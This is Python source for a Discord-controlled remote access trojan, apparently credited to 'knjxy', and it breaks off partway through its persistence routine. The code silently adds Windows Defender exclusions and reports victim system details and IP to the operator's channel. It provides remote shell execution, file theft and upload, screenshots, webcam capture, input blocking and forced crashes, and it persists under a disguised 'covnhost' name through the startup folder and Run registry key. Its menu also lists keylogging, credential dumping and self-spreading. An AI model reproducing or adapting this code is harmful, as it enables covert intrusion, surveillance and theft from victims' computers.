import os
import re
import sys
import cv2
import uuid
import time
import json
import ctypes
import urllib
import base64
import psutil
import shutil
import string
import random
import winreg
import socket
import discord
import getpass
import asyncio
import sqlite3
import tempfile
import requests
import winshell
import winsound
import platform
import datetime
import platform
import pyautogui
import traceback
import threading
import subprocess
import win32crypt
from Crypto.Cipher import AES
from discord.ext import commands
from pynput.keyboard import Key, Listener
create_no_window = 0x08000000

def add_exclusions():
    try:
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(__file__)
        
        exe_name = os.path.basename(exe_path)
        exe_dir = os.path.dirname(exe_path)

        subprocess.run(
            f'powershell -Command "Add-MpPreference -ExclusionProcess "{exe_path}""',
            shell=True, capture_output=True, creationflags=create_no_window
        )

        subprocess.run(
            f'powershell -Command "Add-MpPreference -ExclusionPath "{exe_dir}""',
            shell=True, capture_output=True, creationflags=create_no_window
        )

        if getattr(sys, 'frozen', False):
            subprocess.run(
                f'powershell -Command "Add-MpPreference -ExclusionExtension ".exe""',
                shell=True, capture_output=True, creationflags=create_no_window
            )
        
        return True
    except:
        return False

# config
bot_token = ""
webhook_url = "" # for infodump
user_ids = {}

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# security
def is_authorized(ctx):
    if user_ids is None:
        return True
    return ctx.author.id in user_ids

MY_CHANNEL_ID = None

def correct_channel(ctx):
    global MY_CHANNEL_ID
    if MY_CHANNEL_ID is None:
        return False
    return ctx.channel.id == MY_CHANNEL_ID

# septic tank
def get_pc_id():
    hostname = socket.gethostname()
    try:
        mac = uuid.getnode()
        mac_str = ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
        return f"{hostname}-{mac_str}"
    except:
        return hostname

def get_pc_name():
    return socket.gethostname()

PC_ID_FOR_FILE = get_pc_id().replace(':', '_').replace('-', '_')
SESSION_FILE = os.path.join(os.environ['TEMP'], f'bot_sessions_{PC_ID_FOR_FILE}.json')
current_session = None
SESSION_CATEGORY_NAME = "☠️ victims"

def load_sessions():
    if os.path.exists(SESSION_FILE):
        try:
            with open(SESSION_FILE, 'r') as f:
                all_sessions = json.load(f)
            current_pc = get_pc_name()
            filtered = {}
            for k, v in all_sessions.items():
                if v.get('pc_name') == current_pc:
                    filtered[k] = v
            
            return filtered
        except:
            return {}
    return {}

def save_sessions(sessions):
    try:
        with open(SESSION_FILE, 'w') as f:
            json.dump(sessions, f, indent=2)
    except Exception as e:
        traceback.print_exc()

async def create_session_channel(guild, pc_name, session_num):
    try:
        category = None
        for cat in guild.categories:
            if cat.name == SESSION_CATEGORY_NAME:
                category = cat
                break
        
        if not category:
            category = await guild.create_category(SESSION_CATEGORY_NAME)
        
        existing_sessions = []
        for channel in category.text_channels:
            if channel.name.startswith(f"{pc_name}-session-"):
                try:
                    num = int(channel.name.split('-')[-1])
                    existing_sessions.append(num)
                except:
                    pass

        if existing_sessions:
            session_num = max(existing_sessions) + 1
        
        channel_name = f"{pc_name}-session-{session_num}"
        
        overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
    }

        for user_id in user_ids:
            overwrites[discord.Object(id=user_id)] = discord.PermissionOverwrite(
            read_messages=True, 
            send_messages=True
        )
        
        channel = await category.create_text_channel(
            name=channel_name,
            overwrites=overwrites,
            topic=f"PC: {pc_name} | Session #{session_num} | Started: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        return channel
    except Exception as e:
        return None
    
async def register_session_with_channel(guild):
    global current_session, MY_CHANNEL_ID
    sessions = load_sessions()
    
    pc_id = get_pc_id()
    pc_name = get_pc_name()
    
    session_num = 1
    
    channel = await create_session_channel(guild, pc_name, session_num)

    if channel:
        try:
            session_num = int(channel.name.split('-')[-1])
        except:
            pass
        
        MY_CHANNEL_ID = channel.id
    
    channel_id = channel.id if channel else None

    session_data = {
        'pc_id': pc_id,
        'pc_name': pc_name,
        'session_num': session_num,
        'pid': os.getpid(),
        'hostname': pc_name,
        'user': getpass.getuser(),
        'os': platform.system(),
        'os_release': platform.release(),
        'start_time': datetime.datetime.now().isoformat(),
        'active': True,
        'channel_id': channel_id,
        'ip': socket.gethostbyname(pc_name),
        'cwd': os.getcwd()
    }
    
    session_key = f"{pc_id}-{session_num}"
    sessions[session_key] = session_data
    save_sessions(sessions)
    current_session = session_key
    
    return session_key, session_num, pc_name, channel
def unregister_session():
    global current_session
    if current_session:
        sessions = load_sessions()
        if current_session in sessions:
            sessions[current_session]['active'] = False
            sessions[current_session]['end_time'] = datetime.datetime.now().isoformat()
            save_sessions(sessions)
        current_session = None

# events
@bot.event
async def on_ready():
    
    try:
        if bot.guilds:
            guild = bot.guilds[0]

            session_key, session_num, pc_name, channel = await register_session_with_channel(guild)
            print(f"✅ session created: {session_key}")
            
            if channel:
                await channel.send(f"✅ **{pc_name} - session #{session_num} started!**\n"
                                  f"{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                                  f"system info will be sent here.")
            await auto_send_dm(session_num, pc_name, channel)
        else:
            pass
    except Exception as e:
        traceback.print_exc()

async def auto_send_dm(session_num=None, pc_name=None, channel=None):
    try:
        if not user_ids:
            return
            
        first_user_id = next(iter(user_ids))
        user = await bot.fetch_user(first_user_id)

        hostname = socket.gethostname()
        
        try:
            local_ip = socket.gethostbyname(hostname)
        except:
            local_ip = "Could not get local IP"
        
        try:
            pc_user = os.getenv('USERNAME') or os.getenv('USER') or "Unknown"
        except:
            pc_user = "Unknown"

        public_ip = "Could not get public IP"
        try:
            public_ip = urllib.request.urlopen('https://api.ipify.org', timeout=3).read().decode('utf-8')
        except:
            try:
                public_ip = urllib.request.urlopen('https://icanhazip.com', timeout=3).read().decode('utf-8').strip()
            except:
                pass

        os_name = platform.system()
        os_release = platform.release()
        architecture = platform.machine()
        
        try:
            cpu_cores = psutil.cpu_count(logical=False) or "Unknown"
            cpu_threads = psutil.cpu_count(logical=True) or "Unknown"
            cpu_percent = psutil.cpu_percent(interval=0.1)
        except:
            cpu_cores = "Unknown"
            cpu_threads = "Unknown"
            cpu_percent = "Unknown"
        
        try:
            memory = psutil.virtual_memory()
            ram_total = f"{memory.total / (1024**3):.2f} GB"
            ram_percent = f"{memory.percent}%"
        except:
            ram_total = "Unknown"
            ram_percent = "Unknown"
        
        try:
            disk = psutil.disk_usage('C:\\')
            disk_total = f"{disk.total / (1024**3):.2f} GB"
            disk_percent = f"{disk.percent}%"
        except:
            disk_total = "Unknown"
            disk_percent = "Unknown"
        
        try:
            boot_time = datetime.datetime.fromtimestamp(psutil.boot_time())
            uptime = datetime.datetime.now() - boot_time
            boot_time_str = boot_time.strftime('%Y-%m-%d %H:%M:%S')
            uptime_str = str(uptime).split('.')[0]
        except:
            boot_time_str = "Unknown"
            uptime_str = "Unknown"
        
        pid = os.getpid()

        defender_success = add_exclusions()
        
        pc_text = f"{pc_name}" if pc_name else "Unknown PC"
        session_text = f"session #{session_num}" if session_num else "no session"
        
        defender_status = "✅ added to exclusions" if defender_success else "❌ exclusion failed"
        
        msg = (
            f"# 🐀**R4T started - {pc_text} - {session_text}**\n\n"
            f"**Windows Defender:** {defender_status}\n\n"
            f"**connection**\n"
            f"```\n"
            f"Public IP:  {public_ip}\n"
            f"Local IP:   {local_ip}\n"
            f"Hostname:   {hostname}\n"
            f"User:       {pc_user}\n"
            f"PID:        {pid}\n"
            f"```\n"
            f"**system**\n"
            f"```\n"
            f"OS:         {os_name} {os_release}\n"
            f"Arch:       {architecture}\n"
            f"CPU:        {cpu_cores}C/{cpu_threads}T ({cpu_percent}%)\n"
            f"RAM:        {ram_total} ({ram_percent})\n"
            f"Disk C:     {disk_total} ({disk_percent})\n"
            f"Boot:       {boot_time_str}\n"
            f"Uptime:     {uptime_str}\n"
            f"```\n"
        )
        if channel:
            await channel.send(msg)
            
    except Exception as e:
        for user_id in user_ids:
            try:
                user = await bot.fetch_user(user_id)
                await user.send(f"🐀 Rat started on {pc_name} Session #{session_num} (system info unavailable)")
                if channel and user_id == next(iter(user_ids)):
                    await channel.send(f"🐀 Rat started on {pc_name} Session #{session_num} (system info unavailable)")
            except:
                pass

# commands
@bot.command(name='show', aliases=['commands', 'menu'])
async def helpmenu(ctx):
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return

    embed = discord.Embed(
        title="rat by knjxy",
        color=discord.Color.red()
    )

    commands = (
        "`!admin` - check for admin privileges\n"
        "`!cmd` - command prompt\n"
        "`!website` - open a website\n"
        "`!wallpaper` - change wallpaper\n"
        "`!blockinput`- block any incoming input\n"
        "`!unblockinput` - unblock any incoming input\n"
        "`!open` - open an app\n"
        "`!download` - download a file from infected pc\n"
        "`!upload` - upload a file on infected pc"
        "`!screenshot` - take a screenshot\n"
        "`!sound` - play a .wav only sound\n"
        "`!msg` - custom pop up message\n"
        "`!kill` - kill an open app\n"
        "`!bluescreen` - bluescreen pc\n"
        "`!shutdown` - shutdown pc\n"
        "`!restart` - restart pc\n"
        "`!cam` - take a picture from webcam\n"
        "`!tts` - talk to speech\n"
        "`!persis` - glues the rat to system\n"
        "`!infodump` - steals victims info\n"
        "`!startkeylog` - starts a keylogger\n"
        "`!dumpkeylog` - dumps the keylogger\n"
        "`!stopkeylog`- stops the keylogger\n"
        "`!clskeylog` - clears logs of keylogger\n"
        "`!spread` - tries to spread itself\n"
        "`!disabletaskmgr` - disable task manager\n"
        "`!enabletaskmgr` - enable task manager\n"
        "`!clipboard` - pastes the last thing copied\n"
        "`!displayoff`- turn off display\n"
        "`!displayon` - turn display on\n"
        "`!sleep` - put pc to sleep\n"
        "`!logout` - make victim log out\n"
    )

    embed.add_field(name=" **commands:**", value=commands, inline=False)

    embed.set_footer(text="made by knjxy")

    await ctx.send(embed=embed)

@bot.command(name='admin')
async def checkadmin(ctx):
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return

    if not correct_channel(ctx):
        return
    
    is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    
    if is_admin:
        embed = discord.Embed(
            title="",
            description="✅ R4T is running with admin privileges.",
            color=discord.Color.green()
        )

        process = psutil.Process(os.getpid())
        username = process.username()
        
        embed.add_field(name="running as", value=f"`{username}`", inline=True)
        embed.add_field(name="PID", value=f"`{os.getpid()}`", inline=True)
        
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            title="",
            description="❌ R4T is running without admin privileges.",
            color=discord.Color.red()
        )
        embed.add_field(
            name="⚠️ warning",
            value="some commands may fail.",
            inline=False
        )
        await ctx.send(embed=embed)

@bot.command(name='website', aliases=['web'])
async def open_website(ctx, *, url=None):
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return

    if url is None:
        await ctx.send("? no url detected.")
        return
    
    async with ctx.typing():
        try:
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url

                subprocess.Popen(['cmd', '/c', 'start', '', url], 
                               shell=True, 
                               creationflags=create_no_window)


            await ctx.send(f"📖 opened : {url}")
        except Exception as e:
            await ctx.send(f"❌ failed to open {url} {str(e)}")

@bot.command(name='cmd')
async def run_command(ctx, *, command):
    
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return

    async with ctx.typing():
        try:
            await ctx.send(f"executing: `{command}`")
            
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                encoding='utf-8',
                errors='ignore'
            )
            
            try:
                stdout, stderr = process.communicate(timeout=10)
            except subprocess.TimeoutExpired:
                process.kill()
                stdout, stderr = process.communicate()
                await ctx.send("⚠️ command timed out after 10 seconds")
            
            response = ""
            if stdout:
                output = stdout[:1500] if len(stdout) > 1500 else stdout
                response += f"**output:**\n```\n{output}\n```"
            if stderr:
                error = stderr[:500] if len(stderr) > 500 else stderr
                response += f"**⚠️ errors:**\n```\n{error}\n```"
            
            if not stdout and not stderr:
                response = "✅ command executed (no output)"
            
            if process.returncode == 0:
                response += f"\n✅ exit code: {process.returncode}"
            else:
                response += f"\n❌ exit code: {process.returncode}"
            
            await ctx.send(response)
        
        except Exception as e:
            await ctx.send(f"❌ error: {str(e)}")

@bot.command(name='wallpaper', aliases=['wall'])
async def change_wallpaper(ctx, image_url=None):

    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")

    if not correct_channel(ctx):
        return
    
    async with ctx.typing():
        try:
            if ctx.message.attachments:
                attachment = ctx.message.attachments[0]
                
                allowed_image_extensions = ['.jpg', '.jpeg', '.png', '.bmp', '.gif', '.webp']
                file_ext = os.path.splitext(attachment.filename)[1].lower()
                
                if file_ext not in allowed_image_extensions:
                    await ctx.send(f"❌ unsupported image type, allowed: {', '.join(allowed_image_extensions)}")
                    return
                
                await ctx.send(f"downloading image: {attachment.filename}...")
                
                file_data = await attachment.read()
                
                filename = f"wallpaper_attachment_{''.join(random.choices(string.ascii_letters, k=10))}{file_ext}"
                
            elif image_url:
                await ctx.send(f"downloading image.")
                
                response = requests.get(image_url, timeout=10)
                
                if response.status_code != 200:
                    await ctx.send(f"❌ failed to download image (HTTP {response.status_code})")
                    return
                
                file_data = response.content
                
                if '.' in image_url.split('/')[-1]:
                    file_ext = '.' + image_url.split('/')[-1].split('.')[-1].split('?')[0].lower()
                    if file_ext not in ['.jpg', '.jpeg', '.png', '.bmp', '.gif']:
                        file_ext = '.jpg'
                else:
                    file_ext = '.jpg'
                
                filename = f"wallpaper_url_{''.join(random.choices(string.ascii_letters, k=10))}{file_ext}"
            
            else:
                await ctx.send("❌ no url or image attached was detected.")
                return
            
            if os.name == 'nt':
                filepath = os.path.join(os.environ['TEMP'], filename)
            
            with open(filepath, 'wb') as f:
                f.write(file_data)
            
            if os.name == 'nt':
                ctypes.windll.user32.SystemParametersInfoW(20, 0, filepath, 3)
                
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                        r"Control Panel\Desktop", 
                                        0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "WallpaperStyle", 0, winreg.REG_SZ, "10")
                    winreg.SetValueEx(key, "TileWallpaper", 0, winreg.REG_SZ, "0")
                    winreg.CloseKey(key)
                except:
                    pass
                
                await ctx.send("✅ wallpaper changed.")

            try:
                temp_dir = os.environ['TEMP'] if os.name == 'nt' else '/tmp'
                wallpaper_files = [f for f in os.listdir(temp_dir) if f.startswith('wallpaper_')]
                wallpaper_files.sort(key=lambda x: os.path.getmtime(os.path.join(temp_dir, x)), reverse=True)
                
                for old_file in wallpaper_files[5:]:
                    try:
                        os.remove(os.path.join(temp_dir, old_file))
                    except:
                        pass
            except:
                pass
            
        except requests.exceptions.RequestException as e:
            await ctx.send(f"❌ failed to download image: {str(e)}")
        except Exception as e:
            await ctx.send(f"❌ error: {str(e)}")

@bot.command(name='blockinput')
async def blockinput(ctx):

    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return

    if not correct_channel(ctx):
        return

    try:
        ctypes.windll.user32.BlockInput(True)
    except Exception as e:
        await ctx.send(f"❌ failed {str(e)}")

@bot.command(name='unblockinput')
async def unblockinput(ctx):

    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return

    if not correct_channel(ctx):
        return
    
    try:
        ctypes.windll.user32.BlockInput(False)
    except Exception as e:
        await ctx.send(f"❌ failed {str(e)}")

@bot.command(name='open', aliases=['start', 'run'])
async def run_program(ctx, *, program_name):

    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")

    if not correct_channel(ctx):
        return

    async with ctx.typing():
        try:
            if program_name.lower().endswith('.exe'):
                program_name = program_name[:-4]
            
            subprocess.Popen(
                f'start {program_name}',
                shell=True,
                creationflags=create_no_window,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            await ctx.send(f"✅ {program_name} : opened successfully")
        
        except Exception as e:
            await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='download', aliases=['dl', 'dw'])
async def download_file(ctx, *, file_path):
    
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return

    channel_id = ctx.channel.id
    sessions = load_sessions()
    current_session_data = None
    
    for session in sessions.values():
        if session.get('channel_id') == channel_id:
            current_session_data = session
            break
    
    if not current_session_data:
        await ctx.send(f"❌ could not find session for this channel.")
        return
    
    current_working_dir = current_session_data.get('cwd', os.getcwd())
    
    async with ctx.typing():
        try:
            if os.path.isabs(file_path):
                target_file = file_path
            else:
                target_file = os.path.join(current_working_dir, file_path)
            
            target_file = os.path.abspath(target_file)

            user_profile = os.path.expanduser('~')
            if not target_file.startswith(user_profile):
                await ctx.send(f"❌ access denied: can't download files outside your user profile.")
                return
            
            if not os.path.exists(target_file):
                await ctx.send(f"❌ file does not exist: `{target_file}`")
                return
            
            if os.path.isdir(target_file):
                await ctx.send(f"❌ that's a directory")
                return
            
            file_size = os.path.getsize(target_file)
            max_size = 25 * 1024 * 1024
            
            if file_size > max_size:
                await ctx.send(f"❌ file too large: `{file_size / 1024 / 1024:.1f}MB` (Max: 25MB)")
                return
            
            await ctx.send(f"downloading: `{os.path.basename(target_file)}`", 
                          file=discord.File(target_file))
            
        except PermissionError:
            await ctx.send(f"❌ permission denied: can't access")
        except Exception as e:
            await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='upload', aliases=['up'])
async def upload(ctx):
    
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return

    if not ctx.message.attachments:
        await ctx.send("❌ please attach a file to upload!")
        return
    
    try:
        attachment = ctx.message.attachments[0]
        

        custom_filename = ctx.message.content[8:].strip()
        if custom_filename:
            save_path = os.path.join(os.environ['TEMP'], custom_filename)
        else:
            save_path = os.path.join(os.environ['TEMP'], attachment.filename)
        
        await attachment.save(save_path)
        await ctx.send(f"✅ file uploaded to: {save_path}")
        
    except Exception as e:
        await ctx.send(f"❌ upload failed: {str(e)}")


@bot.command(name='screenshot', aliases=['ss'])
async def take_screenshot(ctx):

    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return
    
    async with ctx.typing():
        try:
            screenshot = pyautogui.screenshot()
            
            filename = f"screenshot_{''.join(random.choices(string.ascii_letters, k=10))}.png"
            
            if os.name == 'nt':
                filepath = os.path.join(os.environ['TEMP'], filename)
            
            screenshot.save(filepath)
            
            await ctx.send("screenshot taken:", file=discord.File(filepath))
            
            os.remove(filepath)
        
        except Exception as e:
            await ctx.send(f"❌ failed to take screenshot: {str(e)}")

@bot.command(name='sound', aliases=['play'])
async def play_audio(ctx):
    
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return

    if not correct_channel(ctx):
        return

    async with ctx.typing():
        try:
            attachment = ctx.message.attachments[0]
            allowed_extensions = ['.mp3', '.wav', '.ogg', '.m4a', '.flac']
            file_ext = os.path.splitext(attachment.filename)[1].lower()
            
            if file_ext not in allowed_extensions:
                await ctx.send(f"❌ unsupported file type. Allowed: {', '.join(allowed_extensions)}")
                return
            
            await ctx.send(f"downloading: {attachment.filename}")
            
            file_data = await attachment.read()
            temp_path = os.path.join(os.environ['TEMP'], f"discord_audio_{attachment.filename}")
            
            with open(temp_path, 'wb') as f:
                f.write(file_data)
            
            await ctx.send(f"playing: {attachment.filename}")
            
            if file_ext == '.wav':
                try:
                    winsound.PlaySound(temp_path, winsound.SND_FILENAME)
                    await ctx.send("✅ played with winsound")
                except Exception as e:
                    await ctx.send(f"❌ winsound failed: {str(e)}")
            
            else:
                try:
                    ps_command = f'''
                    $player = New-Object -ComObject MediaPlayer.MediaPlayer
                    $player.Open("{temp_path}")
                    $player.Controls.Play()
                    Start-Sleep -Seconds 3
                    $player.controls.stop()
                    $player.close()
                    '''
                    
                    subprocess.Popen(
                        ['powershell', '-Command', ps_command],
                        creationflags=create_no_window,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        stdin=subprocess.DEVNULL
                    )
                    await ctx.send("✅ playing with Windows Media Player")
                    
                except Exception as e:
                    try:
                        ps_command = f'''
                        Add-Type -AssemblyName System.Windows.Forms
                        $player = New-Object System.Media.SoundPlayer
                        $player.SoundLocation = "{temp_path}"
                        $player.PlaySync()
                        '''
                        
                        subprocess.Popen(
                            ['powershell', '-Command', ps_command],
                            creationflags=create_no_window,
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            stdin=subprocess.DEVNULL
                        )
                        await ctx.send("✅ playing with system SoundPlayer")
                        
                    except Exception as e:
                        try:
                            ps_command = f'Start-Process "{temp_path}" -WindowStyle Hidden'
                            
                            subprocess.Popen(
                                ['powershell', '-Command', ps_command],
                                creationflags=create_no_window,
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL,
                                stdin=subprocess.DEVNULL
                            )
                            await ctx.send("✅ playing with default player (hidden)")
                            
                        except Exception as e:
                            try:
                                info = subprocess.STARTUPINFO()
                                info.dwFlags = subprocess.STARTF_USESHOWWINDOW
                                info.wShowWindow = 0
                                
                                subprocess.Popen(
                                    ['cmd', '/c', 'start', '', temp_path],
                                    shell=True,
                                    startupinfo=info,
                                    stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL,
                                    stdin=subprocess.DEVNULL
                                )
                                await ctx.send("⚠️ playing (minimized mode)")
                                
                            except Exception as e:
                                await ctx.send(f"❌ all playback methods failed: {str(e)}")
            
            # Optional: Clean up after delay (uncomment if you want auto-delete)
            # async def delete_later():
            #     await asyncio.sleep(30)
            #     if os.path.exists(temp_path):
            #         os.remove(temp_path)
            # asyncio.create_task(delete_later())
            
        except Exception as e:
            await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='msg', aliases=['text'])
async def msgpop(ctx, *, message_text):

    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return

    if not correct_channel(ctx):
        return

    async with ctx.typing():
        try:
            ctypes.windll.user32.MessageBoxW(0, message_text, "System32", 0)
            
            await ctx.send(f"✅ message displayed: \"{message_text}\"")
            
        except Exception as e:
            await ctx.send(f"❌ failed to show messages: {str(e)}")

@bot.command(name='kill', aliases=['taskkill', "prockill"])
async def taskkill(ctx, *, process_name):

    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return
    
    async with ctx.typing():
        try:
            killed_processes = []
            failed_processes = []
            process_name_lower = process_name.lower()

            if process_name_lower.endswith('.exe'):
                process_name_lower = process_name_lower[:-4]
            
            await ctx.send(f"searching for processes matching: `{process_name}`...")
            
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    proc_name = proc.info['name'].lower()
                    if process_name_lower in proc_name or process_name_lower == proc_name.replace('.exe', ''):
                        proc.terminate()
                        killed_processes.append(f"{proc.info['name']} (PID: {proc.info['pid']})")
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    failed_processes.append(proc.info['name'])
            
            if not killed_processes:
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        proc_name = proc.info['name'].lower()
                        if process_name_lower in proc_name or process_name_lower == proc_name.replace('.exe', ''):
                            proc.kill()
                            killed_processes.append(f"{proc.info['name']} (PID: {proc.info['pid']}) [FORCED]")
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        failed_processes.append(proc.info['name'])
            
            if killed_processes:
                response = f"✅ terminated {len(killed_processes)} process(es):\n"
                response += "```\n"
                response += "\n".join(killed_processes[:50])
                if len(killed_processes) > 50:
                    response += f"\n... and {len(killed_processes) - 50} more"
                response += "\n```"
                await ctx.send(response)
            else:
                await ctx.send(f"❌ `{process_name}` isn't running")
            
            if failed_processes:
                await ctx.send(f"⚠️ can't close: {', '.join(failed_processes[:5])}")
        
        except Exception as e:
            await ctx.send(f"❌ error: {str(e)}")

@bot.command(name='bluescreen', aliases=['blues'])
async def bluescreen(ctx):

    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return

    if not correct_channel(ctx):
        return
    
    try:
        await ctx.send("✅ bluescreen worked successfully.")
        subprocess.run(["taskkill", "/F", "/IM", "svchost.exe"], shell=True, creationflags=create_no_window, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        await ctx.send(f"❌ failed to bluescreen pc {str(e)}")

@bot.command(name='shutdown', aliases=['bye', 'sdown'])
async def shutdown(ctx):

    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return
    
    try:
        await ctx.send("✅ shutdown was successful.")
        subprocess.run(["cmd", "shutdown", "/s", "/t", "0"], creationflags=create_no_window)
    except Exception as e:
        await ctx.send(f"❌ failed to shutdown {str(e)}")

@bot.command(name='restart', aliases=['reset', 'retard'])
async def restart(ctx):

    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return
    
    try:
        await ctx.send("✅ shutdown was successful.")
        subprocess.run(["cmd", "shutdown", "/r", "/t", "0"], creationflags=create_no_window)
    except Exception as e:
        await ctx.send(f"❌ failed to shutdown {str(e)}")

@bot.command(name='cam', aliases=['webcam', 'wcam'])
async def webcam(ctx):
    
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return

    async with ctx.typing():
        try:
            temp = os.getenv('TEMP')

            camera = cv2.VideoCapture(0)
            if not camera.isOpened():
                await ctx.send("❌ couldn't access webcam.")
                return
            
            for _ in range(5):
                camera.read()

            return_value, image = camera.read()
            if return_value:
                filepath = os.path.join(temp, "webcam_pic.jpg")
                cv2.imwrite(filepath, image)

                await ctx.send("webcam pic", 
                              file=discord.File(filepath, filename="webcam.jpg"))

                os.remove(filepath)
            else:
                await ctx.send("❌ Failed to capture image from webcam.")
            
            camera.release()
            
        except Exception as e:
            await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='tts', aliases=['speak', 'say'])
async def text_to_speech(ctx, *, text):
    
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return

    async with ctx.typing():
        try:
            ps_command = f'''
            Add-Type -AssemblyName System.Speech;
            $synth = New-Object System.Speech.Synthesis.SpeechSynthesizer;
            $synth.Speak("{text}");
            '''
            
            subprocess.Popen(
                ['powershell', '-Command', ps_command],
                creationflags=create_no_window,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            await ctx.send(f"speaking: \"{text}\"")
            
        except Exception as e:
            try:
                vbs_path = os.path.join(os.environ['TEMP'], "speak.vbs")
                with open(vbs_path, 'w') as f:
                    f.write(f'''
                    CreateObject("SAPI.SpVoice").Speak "{text}"
                    ''')
                
                subprocess.Popen(
                    ['cscript', vbs_path],
                    creationflags=create_no_window,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )

                threading.Timer(5.0, lambda: os.remove(vbs_path) if os.path.exists(vbs_path) else None).start()
                
                await ctx.send(f"speaking: \"{text}\"")
                
            except Exception as e2:
                await ctx.send(f"❌ failed to speak: {str(e2)}")

@bot.command(name='persis', aliases=['stick', 'glue', 'stay', 'pls'])
async def sticktosystem(ctx):
    
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return

    async with ctx.typing():
        try:
            username = getpass.getuser()
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
                exe_dir = os.path.dirname(exe_path)
                exe_name = "covnhost.exe"
                new_exe_path = os.path.join(exe_dir, exe_name)
                
                if not exe_path.endswith('covnhost.exe'):
                    try:
                        shutil.copy2(exe_path, new_exe_path)
                        exe_path = new_exe_path
                    except:
                        pass
            else:
                script_path = os.path.abspath(__file__)
                exe_dir = os.path.dirname(script_path)
                exe_name = "covnhost.exe"
                exe_path = os.path.join(exe_dir, exe_name)
            
            results = []
            methods_used = []

            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
            
            startup_folder = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
            shortcut_name = "covnhost.lnk"
            
            if getattr(sys, 'frozen', False):
                shortcut_path = os.path.join(startup_folder, shortcut_name)
                winshell.CreateShortcut(
                    Path=shortcut_path,
                    Target=exe_path,
                    Description="System Host Process",
                    Arguments="",
                    StartIn=os.path.dirname(exe_path)
                )
            else:
                bat_path = os.path.join(startup_folder, "covnhost.bat")
                with open(bat_path, 'w') as f:
                    f.write(f'''@echo off
cd /d "{os.path.dirname(script_path)}"
start /b pythonw "{script_path}"
exit''')
            
            results.append(f"✅ added to startup folder")
            methods_used.append("Startup Folder")

            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                    r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                    0, winreg.KEY_SET_VALUE)
                
                if getattr(sys, 'frozen', False):
                    winreg.SetValueEx(key, "covnhost", 0, winreg.REG_SZ, f'"{exe_path}"')
                else:
                    winreg.SetValueEx(key, "covnhost", 0, winreg.REG_SZ, f'pythonw "{script_path}"')
                
                winreg.CloseKey(key)
                results.append(f"✅ added to HKCU run registry")
                methods_used.append("registry (Current User)")
            except Exception as e:
                results.append(f"❌ registry (HKCU) failed: {str(e)}")

            if is_admin:
                try:
